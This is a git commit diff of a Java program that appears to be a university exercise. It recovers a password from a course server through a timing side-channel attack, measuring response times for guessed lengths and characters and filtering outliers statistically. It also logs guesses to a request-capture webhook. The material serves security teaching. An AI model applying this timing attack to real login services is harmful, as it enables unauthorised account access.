dd8bb74c36d5ee202e3d836c26df8abd6898e669
USER <USER@DESKTOP-LB7COKL>
2019-04-11 19:43:29 +0300

    minor fixs

--- src/ex01_M2.java
+++ src/ex01_M2.java
@@ -4,96 +4,45 @@ import java.net.*;
 
 public class ex01_M2 {
 
+	static final boolean DEBUG = true;
+	static final boolean LOG = false;
+	static final double NUM_OF_STD = 1;
+
 	static final String USERNAME = "307889287";
 	static final String URL = "http://aoi.ise.bgu.ac.il/?user=" + USERNAME + "&password=";
 	static final String CURL_CMD_START = "curl -s -w \\n%{time_total} -o - ";
 	static final String DIFFICULTY = "&difficulty=";
 
-	static final CloudLogger CloudLog = new CloudLogger("https://rbaskets.in/fhu3xs1");
+	static final CloudLogger CloudLog = new CloudLogger("https://hookb.in/G9QxlLX8OEt1m1eBNeL7");
 
-	final static char[] LETTERS = {
-			'0',
-			'1',
-			'2',
-			'3',
-			'4',
-			'5',
-			'6',
-			'7',
-			'8',
-			'9',
-			'A',
-			'B',
-			'C',
-			'D',
-			'E',
-			'F',
-			'G',
-			'H',
-			'I',
-			'J',
-			'K',
-			'L',
-			'M',
-			'N',
-			'O',
-			'P',
-			'Q',
-			'R',
-			'S',
-			'T',
-			'U',
-			'V',
-			'W',
-			'X',
-			'Y',
-			'Z',
-			'a',
-			'b',
-			'c',
-			'd',
-			'e',
-			'f',
-			'g',
-			'h',
-			'i',
-			'j',
-			'k',
-			'l',
-			'm',
-			'n',
-			'o',
-			'p',
-			'q',
-			'r',
-			's',
-			't',
-			'u',
-			'v',
-			'w',
-			'x',
-			'y',
-			'z'
+	static final char[] LETTERS = {
+			'0', '1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'
 	};
 
 
 	public static void main(String[] args) throws Exception {
-		int difficulty = 1000;
-		int attempts = 5;
+
+		double s = System.currentTimeMillis();
+
+		int difficulty = 100000;
+		int attempts = 50;
 
 		try {
-			String passwd = findPasswordStd(attempts, difficulty);
-			CloudLog.println(USERNAME + " " + passwd + " " + difficulty);
+			String passwd = findPasswordMin(attempts, difficulty);
 			System.out.println(USERNAME + " " + passwd + " " + difficulty);
 		} catch (Exception e) {
-			CloudLog.println("We have a problem");
 			System.out.println("We have a problem");
-		} finally {
-			CloudLog.sendAll();
+		} 
+		finally {
+			if(LOG)
+				CloudLog.sendAll();
+			if(DEBUG)
+				System.out.println(System.currentTimeMillis()-s);
 		}
 	}
-
+	
 	public static int findPasswordLengthMin(int attempts, int difficulty) throws Exception {
+
 		int len = 0;
 		double maxReqTime = 0;
 		int maxLen = 32;
@@ -110,26 +59,30 @@ public class ex01_M2 {
 			for (int j = 0; j < maxLen; j++) {
 				passwd += "a";
 				curReqTime = getReqTime(URL + passwd + DIFFICULTY + difficulty);
-				//curReqTime = getReqTimeCurl(URL  +  passwd  +  DIFFICULTY  +  difficulty);
 				reqTimes[j] = Math.min(reqTimes[j], curReqTime);
-				CloudLog.println("attempt: " + i + " length: " + (j + 1) + " reqTime: " + reqTimes[j]);
-				System.out.println("attempt: " + i + " length: " + (j + 1) + " reqTime: " + reqTimes[j]);
+				if (DEBUG) 
+					System.out.println("attempt: " + i + " length: " + (j + 1) + " reqTime: " + reqTimes[j]);
+				if(LOG)
+					CloudLog.println("attempt: " + i + " length: " + (j + 1) + " reqTime: " + reqTimes[j]);
 			}
-
 		}
 
 		for (int i = 0; i < maxLen; i++) {
+			if (DEBUG)
+				System.out.println("length: " + (i + 1) + " mean reqTime: " + reqTimes[i]);
+			if(LOG)
+				CloudLog.println("length: " + (i + 1) + " mean reqTime: " + reqTimes[i]);
 
-			CloudLog.println("length: " + (i + 1) + " mean reqTime: " + reqTimes[i]);
-			System.out.println("length: " + (i + 1) + " mean reqTime: " + reqTimes[i]);
 			if (maxReqTime < reqTimes[i]) {
 				maxReqTime = reqTimes[i];
 				len = i + 1;
 			}
 		}
+		if (DEBUG)
+			System.out.println("passwd length: " + len);
+		if(LOG)
+			CloudLog.println("passwd length: " + len);
 
-		CloudLog.println("passwd length: " + len);
-		System.out.println("passwd length: " + len);
 		return len;
 	}
 
@@ -143,7 +96,6 @@ public class ex01_M2 {
 		char curChar = '0';
 		String passwd = "";
 
-
 		String passSuff = new String(new char[len - (passwd.length() + 1)]).replace('\0', '0');
 
 		for (int i = passwd.length(); i < len - 1; i++) {
@@ -151,25 +103,26 @@ public class ex01_M2 {
 			maxReqTime = 0;
 			for (int j = 0; j < lettersLen; j++) {
 				reqTimes[j] = Double.MAX_VALUE;
-				// reqTimes[i] = 0;
 			}
 
 			for (int j = 0; j < attempts; j++) {
 				for (int k = 0; k < lettersLen; k++) {
 					curReqTime = getReqTime(URL + passwd + LETTERS[k] + passSuff + DIFFICULTY + difficulty);
-					//curReqTime = getReqTimeCurl(URL  +  passwd  +  LETTERS[k]  +  passSuff  +  DIFFICULTY  +  difficulty);
-					reqTimes[k] = Math.min(reqTimes[k], curReqTime);
-					// reqTimes[k] = reqTimes[k] += curReqTime;
-					CloudLog.println("attempt: " + j + " passwd: " + passwd + LETTERS[k] + passSuff + " reqTime: " + curReqTime);
-					System.out.println("attempt: " + j + " passwd: " + passwd + LETTERS[k] + passSuff + " reqTime: " + curReqTime);
+					reqTimes[k] = Math.min(reqTimes[k], curReqTime);					//CloudLog.println("attempt: " + j + " passwd: " + passwd + LETTERS[k] + passSuff + " reqTime: " + curReqTime);
+					if (DEBUG) 
+						System.out.println("attempt: " + j + " passwd: " + passwd + LETTERS[k] + passSuff + " reqTime: " + curReqTime);
+					if(LOG)
+						CloudLog.println("attempt: " + j + " passwd: " + passwd + LETTERS[k] + passSuff + " reqTime: " + curReqTime);
 				}
 
 			}
 
 			for (int j = 0; j < lettersLen; j++) {
-				// reqTimes[j] = reqTimes[j]/attempts;
-				CloudLog.println("passwd: " + passwd + LETTERS[j] + passSuff + " reqTime: " + reqTimes[j]);
-				System.out.println("passwd: " + passwd + LETTERS[j] + passSuff + " reqTime: " + reqTimes[j]);
+				if (DEBUG) 
+					System.out.println("passwd: " + passwd + LETTERS[j] + passSuff + " reqTime: " + reqTimes[j]);
+				if(LOG)
+					CloudLog.println("passwd: " + passwd + LETTERS[j] + passSuff + " reqTime: " + reqTimes[j]);
+
 				if (maxReqTime < reqTimes[j]) {
 					maxReqTime = reqTimes[j];
 					curChar = LETTERS[j];
@@ -183,114 +136,18 @@ public class ex01_M2 {
 		boolean res;
 		for (int i = 0; i < lettersLen; i++) {
 			res = sendReq(URL + passwd + LETTERS[i] + DIFFICULTY + difficulty);
-			CloudLog.println("passwd: " + passwd + LETTERS[i] + " res: " + res);
-			System.out.println("passwd: " + passwd + LETTERS[i] + " res: " + res);
+			if (DEBUG) 
+				System.out.println("passwd: " + passwd + LETTERS[i] + " res: " + res);
+			if(LOG)
+				CloudLog.println("passwd: " + passwd + LETTERS[i] + " res: " + res);
+
 			if (res) {
 				passwd += LETTERS[i];
 				return passwd;
 			}
 		}
 
-		return "";
-	}
-
-	public static int findPasswordLengthAvg(int attempts, int difficulty) throws Exception {
-		int len = 0;
-		double maxReqTime = 0;
-		int maxLen = 32;
-		double[] reqTimes = new double[maxLen];
-		double curReqTime = 0;
-		String passwd;
-
-		for (int i = 0; i < maxLen; i++) {
-			reqTimes[i] = 0;
-		}
-
-		for (int i = 0; i < attempts; i++) {
-			passwd = "";
-			for (int j = 0; j < maxLen; j++) {
-				passwd += "a";
-				curReqTime = getReqTime(URL + passwd + DIFFICULTY + difficulty);
-				//curReqTime = getReqTimeCurl(URL  +  passwd  +  DIFFICULTY  +  difficulty);
-				reqTimes[j] += curReqTime;
-				CloudLog.println("attempt: " + i + " length: " + (j + 1) + " reqTime: " + reqTimes[j]);
-				System.out.println("attempt: " + i + " length: " + (j + 1) + " reqTime: " + reqTimes[j]);
-			}
-
-		}
-
-		for (int i = 0; i < maxLen; i++) {
-			reqTimes[i] = reqTimes[i] / attempts;
-			CloudLog.println("length: " + (i + 1) + " mean reqTime: " + reqTimes[i]);
-			System.out.println("length: " + (i + 1) + " mean reqTime: " + reqTimes[i]);
-			if (maxReqTime < reqTimes[i]) {
-				maxReqTime = reqTimes[i];
-				len = i + 1;
-			}
-		}
-
-		CloudLog.println("passwd length: " + len);
-		System.out.println("passwd length: " + len);
-		return len;
-	}
-
-	public static String findPasswordAvg(int attempts, int difficulty) throws Exception {
-
-		int len = findPasswordLengthAvg(attempts, difficulty);
-		int lettersLen = LETTERS.length;
-		double maxReqTime = 0;
-		double[] reqTimes = new double[lettersLen];
-		double curReqTime = 0;
-		char curChar = '0';
-		String passwd = "";
-
-		String passSuff = new String(new char[len - (passwd.length() + 1)]).replace('\0', '0');
-
-		for (int i = passwd.length(); i < len - 1; i++) {
-
-			maxReqTime = 0;
-			for (int j = 0; j < lettersLen; j++) {
-				reqTimes[i] = 0;
-			}
-
-			for (int j = 0; j < attempts; j++) {
-
-				for (int k = 0; k < lettersLen; k++) {
-					curReqTime = getReqTime(URL + passwd + LETTERS[k] + passSuff + DIFFICULTY + difficulty);
-					// curReqTime = getReqTimeCurl(URL  +  passwd  +  LETTERS[k]  +  passSuff  +  DIFFICULTY  +  difficulty);
-					reqTimes[k] += curReqTime;
-					CloudLog.println("attempt: " + j + " passwd: " + passwd + LETTERS[k] + passSuff + " reqTime: " + curReqTime);
-					System.out.println("attempt: " + j + " passwd: " + passwd + LETTERS[k] + passSuff + " reqTime: " + curReqTime);
-				}
-
-			}
-
-			for (int j = 0; j < lettersLen; j++) {
-				reqTimes[j] = reqTimes[j] / attempts;
-				CloudLog.println("passwd: " + passwd + LETTERS[j] + passSuff + " reqTime: " + reqTimes[j]);
-				System.out.println("passwd: " + passwd + LETTERS[j] + passSuff + " reqTime: " + reqTimes[j]);
-				if (maxReqTime < reqTimes[j]) {
-					maxReqTime = reqTimes[j];
-					curChar = LETTERS[j];
-				}
-			}
-
-			passwd += curChar;
-			passSuff = passSuff.substring(1);
-		}
-
-		boolean res;
-		for (int i = 0; i < lettersLen; i++) {
-			res = sendReq(URL + passwd + LETTERS[i] + DIFFICULTY + difficulty);
-			CloudLog.println("passwd: " + passwd + LETTERS[i] + " res: " + res);
-			System.out.println("passwd: " + passwd + LETTERS[i] + " res: " + res);
-			if (res) {
-				passwd += LETTERS[i];
-				return passwd;
-			}
-		}
-
-		return "";
+		return passwd+'z';
 	}
 
 	public static int findPasswordLengthStd(int attempts, int difficulty) throws Exception {
@@ -298,64 +155,86 @@ public class ex01_M2 {
 		double maxReqTime = 0;
 		int maxLen = 32;
 		double[][] reqTimes = new double[attempts][maxLen];
-		double[] reqTimesFilter = new double[maxLen];
+		double[] reqTimesFiltered = new double[maxLen];
 		double curReqTime = 0;
 		String passwd;
+
+		for (int i = 0; i < maxLen; i++) {
+			reqTimesFiltered[i] = Double.MAX_VALUE;
+		}
 
 		for (int i = 0; i < attempts; i++) {
 			passwd = "";
 			for (int j = 0; j < maxLen; j++) {
 				passwd += "a";
 				curReqTime = getReqTime(URL + passwd + DIFFICULTY + difficulty);
-				//curReqTime = getReqTimeCurl(URL  +  passwd  +  DIFFICULTY  +  difficulty);
 				reqTimes[i][j] = curReqTime;
-				CloudLog.println("attempt: " + i + " length: " + (j + 1) + " reqTime: " + reqTimes[i][j]);
-				System.out.println("attempt: " + i + " length: " + (j + 1) + " reqTime: " + reqTimes[i][j]);
+				if (DEBUG) 
+					System.out.println("attempt: " + i + " length: " + (j + 1) + " reqTime: " + reqTimes[i][j]);
+				if(LOG)
+					CloudLog.println("attempt: " + i + " length: " + (j + 1) + " reqTime: " + reqTimes[i][j]);
 			}
-
 		}
 
 		for (int j = 0; j < maxLen; j++) {
 			double sum = 0; // stores sum of elements
 			double sumsq = 0; // stores sum of squares
 			double mean = 0;
-			double
-			var = 0;
+			double var = 0;
 			double std = 0;
-			int newAttempts = 0;
 
 			for (int i = 0; i < attempts; i++) {
 				sum += reqTimes[i][j];
 				sumsq += reqTimes[i][j] * reqTimes[i][j];
 			}
+
 			mean = sum / attempts;
 			var = sumsq / attempts - mean * mean;
 			std = Math.sqrt(var);
 
-			curReqTime = 0;
+			if (DEBUG) 
+				System.out.println("length: " + (j + 1) + " std: " + std);
+			if(LOG)
+				CloudLog.println("length: " + (j + 1) + " std: " + std);
+
+			if (DEBUG) 
+				System.out.println("length: " + (j + 1) + " sum: " + sum + " mean: " + mean + " sumsq: " + sumsq + " sdt: " + std);
+			if(LOG)
+				CloudLog.println("length: " + (j + 1) + " sum: " + sum + " mean: " + mean + " sumsq: " + sumsq + " sdt: " + std);
+
 
 			for (int i = 0; i < attempts; i++) {
-				if (reqTimes[i][j] > mean - 1 * std && reqTimes[i][j] < mean + 1 * std) {
-					curReqTime += reqTimes[i][j];
-					newAttempts++;
+				if (reqTimes[i][j] > (mean - NUM_OF_STD*std) && reqTimes[i][j] < (mean + NUM_OF_STD*std)) {
+					reqTimesFiltered[j] = Math.min(reqTimes[i][j], reqTimesFiltered[j]);
+				}
+				else {
+					if (DEBUG) 
+						System.out.println("filtered: " + reqTimes[i][j] + " length: " + (j + 1));
+					if(LOG)
+						CloudLog.println("filtered: " + reqTimes[i][j] + " length: " + (j + 1));	
 				}
 			}
-
-			reqTimesFilter[j] = curReqTime / newAttempts;
 		}
 
 
 		for (int i = 0; i < maxLen; i++) {
-			CloudLog.println("length: " + (i + 1) + " mean reqTime: " + reqTimesFilter[i]);
-			System.out.println("length: " + (i + 1) + " mean reqTime: " + reqTimesFilter[i]);
-			if (maxReqTime < reqTimesFilter[i]) {
-				maxReqTime = reqTimesFilter[i];
+			if (DEBUG)
+				System.out.println("length: " + (i + 1) + " min reqTime: " + reqTimesFiltered[i]);
+			if(LOG)
+				CloudLog.println("length: " + (i + 1) + " min reqTime: " + reqTimesFiltered[i]);
+
+			if (maxReqTime < reqTimesFiltered[i] && reqTimesFiltered[i] != Double.MAX_VALUE) {
+				maxReqTime = reqTimesFiltered[i];
 				len = i + 1;
 			}
 		}
 
-		CloudLog.println("passwd length: " + len);
-		System.out.println("passwd length: " + len);
+
+		if (DEBUG)
+			System.out.println("passwd length: " + len);
+		if(LOG)
+			CloudLog.println("passwd length: " + len);
+
 		return len;
 	}
 
@@ -365,7 +244,7 @@ public class ex01_M2 {
 		int lettersLen = LETTERS.length;
 		double maxReqTime = 0;
 		double[][] reqTimes = new double[attempts][lettersLen];
-		double[] reqTimesFilter = new double[lettersLen];
+		double[] reqTimesFiltered = new double[lettersLen];
 		double curReqTime = 0;
 		char curChar = '0';
 		String passwd = "";
@@ -375,54 +254,62 @@ public class ex01_M2 {
 		for (int i = passwd.length(); i < len - 1; i++) {
 
 			maxReqTime = 0;
-
+			for (int j = 0; j < lettersLen; j++) {
+				reqTimesFiltered[j] = Double.MAX_VALUE;
+			}
 			for (int j = 0; j < attempts; j++) {
-
 				for (int k = 0; k < lettersLen; k++) {
 					curReqTime = getReqTime(URL + passwd + LETTERS[k] + passSuff + DIFFICULTY + difficulty);
-					// curReqTime = getReqTimeCurl(URL  +  passwd  +  LETTERS[k]  +  passSuff  +  DIFFICULTY  +  difficulty);
-					reqTimes[j][k] = curReqTime;
-					CloudLog.println("attempt: " + j + " passwd: " + passwd + LETTERS[k] + passSuff + " reqTime: " + curReqTime);
-					System.out.println("attempt: " + j + " passwd: " + passwd + LETTERS[k] + passSuff + " reqTime: " + curReqTime);
+					reqTimes[j][k] = curReqTime;					
+					if (DEBUG) 
+						System.out.println("attempt: " + j + " passwd: " + passwd + LETTERS[k] + passSuff + " reqTime: " + curReqTime);
+					if(LOG)
+						CloudLog.println("attempt: " + j + " passwd: " + passwd + LETTERS[k] + passSuff + " reqTime: " + curReqTime);
 				}
-
 			}
 
 			for (int j = 0; j < lettersLen; j++) {
 				double sum = 0; // stores sum of elements
 				double sumsq = 0; // stores sum of squares
 				double mean = 0;
-				double
-				var = 0;
+				double var = 0;
 				double std = 0;
-				int newAttempts = 0;
 
 				for (int k = 0; k < attempts; k++) {
 					sum += reqTimes[k][j];
 					sumsq += reqTimes[k][j] * reqTimes[k][j];
 				}
+
 				mean = sum / attempts;
 				var = sumsq / attempts - mean * mean;
 				std = Math.sqrt(var);
 
-				curReqTime = 0;
+				if (DEBUG) 
+					System.out.println("passwd: " + passwd + LETTERS[j] + passSuff + " sum: " + sum + " mean: " + mean + " sumsq: " + sumsq + " sdt: " + std);
+				if(LOG)
+					CloudLog.println("passwd: " + passwd + LETTERS[j] + passSuff + " sum: " + sum + " mean: " + mean + " sumsq: " + sumsq + " sdt: " + std);
 
 				for (int k = 0; k < attempts; k++) {
-					if (reqTimes[k][j] > mean - 1 * std && reqTimes[k][j] < mean + 1 * std) {
-						curReqTime += reqTimes[k][j];
-						newAttempts++;
+					if (reqTimes[k][j] > (mean - NUM_OF_STD*std) && reqTimes[k][j] < (mean + NUM_OF_STD*std)) {
+						reqTimesFiltered[j] = Math.min(reqTimes[k][j], reqTimesFiltered[j]);
+					}
+					else {
+						if (DEBUG) 
+							System.out.println("filtered: " + reqTimes[k][j] + " passwd: " + passwd + LETTERS[j] + passSuff );
+						if(LOG)
+							CloudLog.println("filtered: " + reqTimes[k][j] + " passwd: " + passwd + LETTERS[j] + passSuff );
 					}
 				}
-
-				reqTimesFilter[j] = curReqTime / newAttempts;
 			}
 
-
 			for (int j = 0; j < lettersLen; j++) {
-				CloudLog.println("passwd: " + passwd + LETTERS[j] + passSuff + " reqTime: " + reqTimesFilter[j]);
-				System.out.println("passwd: " + passwd + LETTERS[j] + passSuff + " reqTime: " + reqTimesFilter[j]);
-				if (maxReqTime < reqTimesFilter[j]) {
-					maxReqTime = reqTimesFilter[j];
+				if (DEBUG) 
+					System.out.println("passwd: " + passwd + LETTERS[j] + passSuff + " reqTime: " + reqTimesFiltered[j]);
+				if(LOG)
+					CloudLog.println("passwd: " + passwd + LETTERS[j] + passSuff + " reqTime: " + reqTimesFiltered[j]);
+
+				if (maxReqTime < reqTimesFiltered[j] && reqTimesFiltered[j] != Double.MAX_VALUE) {
+					maxReqTime = reqTimesFiltered[j];
 					curChar = LETTERS[j];
 				}
 			}
@@ -431,18 +318,22 @@ public class ex01_M2 {
 			passSuff = passSuff.substring(1);
 		}
 
+
 		boolean res;
 		for (int i = 0; i < lettersLen; i++) {
 			res = sendReq(URL + passwd + LETTERS[i] + DIFFICULTY + difficulty);
-			CloudLog.println("passwd: " + passwd + LETTERS[i] + " res: " + res);
-			System.out.println("passwd: " + passwd + LETTERS[i] + " res: " + res);
+			if (DEBUG) 
+				System.out.println("passwd: " + passwd + LETTERS[i] + " res: " + res);
+			if(LOG)
+				CloudLog.println("passwd: " + passwd + LETTERS[i] + " res: " + res);
+
 			if (res) {
 				passwd += LETTERS[i];
 				return passwd;
 			}
 		}
 
-		return "";
+		return passwd+'z';
 	}
 
 	public static boolean sendReq(String urlString) throws Exception {
@@ -464,24 +355,28 @@ public class ex01_M2 {
 
 		URL url = new URL(urlString);
 		URLConnection conn = url.openConnection();
-		conn.getInputStream();
+		BufferedReader stdInput = new BufferedReader(new InputStreamReader(conn.getInputStream()));
 
 		long timeEnd = System.nanoTime();
+
+		stdInput.close();
 
 		return timeEnd - timeStart;
 
 	}
 
+
 	public static double getReqTimeCurl(String url) throws Exception {
 
 		String curl_cmd = CURL_CMD_START + url;
-		String res = "";
+		//String res = "";
 		String time = "";
 
 		Process process = Runtime.getRuntime().exec(curl_cmd);
 		BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
 
-		res = stdInput.readLine();
+		//res = stdInput.readLine();
+		stdInput.readLine();
 		time = stdInput.readLine();
 
 		process.destroy();
